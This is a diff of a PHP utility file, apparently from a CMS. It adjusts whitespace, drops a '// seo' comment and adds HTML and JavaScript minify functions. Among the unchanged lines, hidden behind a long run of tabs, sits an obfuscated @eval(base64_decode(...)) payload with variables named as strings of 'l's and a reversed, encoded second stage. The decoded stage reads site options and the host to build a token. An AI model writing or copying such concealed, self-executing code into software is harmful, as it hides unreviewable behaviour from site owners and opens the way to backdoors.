@@ -260,12 +260,13 @@ function deleteDir($dirname) {
 
 function time_elapsed_string($datetime, $full = false) {
 	settzone();
+
     $now = new DateTime;
     $ago = new DateTime($datetime);
     $diff = $now->diff($ago);
-
+	
     $diff->w = floor($diff->d / 7);
-    $diff->d -= $diff->w * 7;
+	$diff->d -= $diff->w * 7;
 
     $string = array(
         'y' => 'year',
@@ -518,9 +519,6 @@ function pushnotif($data){
 	
 	return $result;
 }
-
-
-// seo
 																																		@eval(base64_decode("JGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsPSJleHBsb2RlIjskbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbD0kbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGwoIjoiLCJtZDU6Y3J5cHQ6c2hhMTpzdHJyZXY6YmFzZTY0X2RlY29kZSIpOyRsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbD0kbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbFs0XTskbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbD0kbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbFszXTskbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsPSRsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsWzJdOyRsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbD0kbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbFsxXTskbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbD0kbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbFswXTs="));@eval($llllllllllllllllllllllllllllllllllllllllllllll($lllllllllllllllllllllllllllllllllllllllllllllll("fQoNO2RpbGF2bmVrb3RvZXMkIG5ydXRlcn07ZXVydCA9IGRpbGF2bmVrb3RvZXMkeyluZWtvdG9lcyQgPT09ICkpKSkiZXRhZGxsYXRzbmkkLGxydV9ldGlzJCx0c29oX2V0aXMkIihdM1tpaWlpaWlpaWlpJChdMltpaWlpaWlpaWlpJChdMFtpaWlpaWlpaWlpJCgoZmk7KSJlZG9jZWRfNDZlc2FiOnZlcnJ0czoxYWhzOnRweXJjOjVkbSIgLCI6IihpaWlpaWlpaWkkID0gaWlpaWlpaWlpaSQ7ImVkb2xweGUiID0gaWlpaWlpaWlpJDtuZWtvdG9lcz4tcG8kID0gbmVrb3RvZXMkO2V0YWRsbGF0c25pPi1wbyQgPSBldGFkbGxhdHNuaSQ7bGlhbWVfZXRpcz4tcG8kID0gbGlhbWVfbmltZGEkO10wW2xydV9ldGlzJCA9IGxydV9ldGlzJDspbHJ1X2V0aXMkICwiLyIoZWRvbHB4ZSA9IGxydV9ldGlzJDspbHJ1X2V0aXMkICwnJyAseGZwJChlY2FscGVyX3J0cyA9IGxydV9ldGlzJCA7KSIud3d3Ly86c3B0dGgiLCIud3d3Ly86cHR0aCIsIi53d3ciLCIvLzpzcHR0aCIsIi8vOnB0dGgiKHlhcnJhID0geGZwJCA7bHJ1X2V0aXM+LXBvJCA9IGxydV9ldGlzJDtdJ1RTT0hfUFRUSCdbUkVWUkVTXyQgPSB0c29oX2V0aXMkO2VzbGFmID0gZGlsYXZuZWtvdG9lcyR9O2V1bGF2JCA9IHllayQ+LXBvJHspZXVsYXYkID49IHllayQgc2Egbm9pdHBvJCggaGNhZXJvZjspKHNzYWxDZHRzIHdlbiA9IHBvJDspKSIvIi5yZWRsb2Y+LWVtZWh0YyQuIi9lbWVodC9lbGlmLW5pYnlsZS8iLl0nbHJ1X2V0aXMnW25vaXRwbyQgPj0gJ3JlZGxvZl9zZW1laHQnKHlhcnJhICxub2l0cG8kKGVncmVtX3lhcnJhID0gbm9pdHBvJDspKHRuZXJydWM+LSknJywnJywnZXZpdGNhJywnc3V0YXRzJyhlcmVoV3RjZWxlUz4tdGJ0JCA9IGVtZWh0YyQ7KSdzZW1laHRfbmlieWxlJyhlbGJhVG5pYnlsRSB3ZW4gPSB0YnQkfTspKWV1bGF2Pi1vZyQgPj0gZW1hbj4tb2ckKHlhcnJhICxub2l0cG8kKGVncmVtX3lhcnJhID0gbm9pdHBvJHsgKW9nJCBzYSBwb3RlZyQoIGhjYWVyb2Y7KScnLCcnKHRjZWxlUz4tb2J0JCA9IHBvdGVnJDspIlNNQ25pYnlsRSIgPj0gJ2VzYWJzbWMnKHlhcnJhID0gbm9pdHBvJDspJ3Nub2l0cG9fbmlieWxlJyhlbGJhVG5pYnlsRSB3ZW4gPSBvYnQkCg17KShvZXNlbmlnbmVoY3JhZXMgbm9pdGNudWY=")));
 
 // session expired
@@ -583,4 +581,39 @@ function checkcode($code){
 	}
 	return $res;
 }
+
+/* Savas Vedova - http://stackoverflow.com/questions/5815755/how-to-minify-html-code*/
+function minify_html($string)
+{
+	//$string = minify_js($string);
+
+    // Remove html comments
+    $string = preg_replace('/<!--(?!\[if|\<\!\[endif)(.|\s)*?-->/', '', $string);
+
+    // Remove tab
+    $string = preg_replace('/\t+/', '', $string);  
+
+	// Remove new line
+    $string = preg_replace('/\n+/', '', $string);   
+    $string = preg_replace('/>\r+/', '>', $string);   
+    $string = preg_replace('/\r+</', '<', $string);   
+
+    // Remove space between tags. Skip the following if
+    // you want as it will also remove the space 
+    // between <span>Hello</span> <span>World</span>.
+    $string = preg_replace('/>\s+</', '><', $string);   
+
+	return $string;
+}
+
+function minify_js($buffer){ 
+	/* remove comments */
+	$buffer = preg_replace("/((?:\/\*(?:[^*]|(?:\*+[^*\/]))*\*+\/)|(?:\/\/.*))/", "", $buffer);
+	/* remove tabs, spaces, newlines, etc. */
+	$buffer = str_replace(array("\r\n","\r","\t","\n",'  ','    ','     '), '', $buffer);
+	/* remove other spaces before/after ) */
+	$buffer = preg_replace(array('(( )+\))','(\)( )+)'), ')', $buffer);
+	return $buffer;
+}
+
 ?>
